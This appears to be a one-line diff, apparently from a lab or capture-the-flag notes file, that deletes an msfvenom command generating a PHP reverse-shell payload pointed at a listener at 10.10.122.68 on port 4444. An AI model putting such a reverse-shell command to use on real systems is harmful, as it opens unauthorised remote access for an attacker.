@@ -1,1 +1,1 @@
-msfvenom -p php/reverse_php lport=4444 lhost=10.10.122.68
+
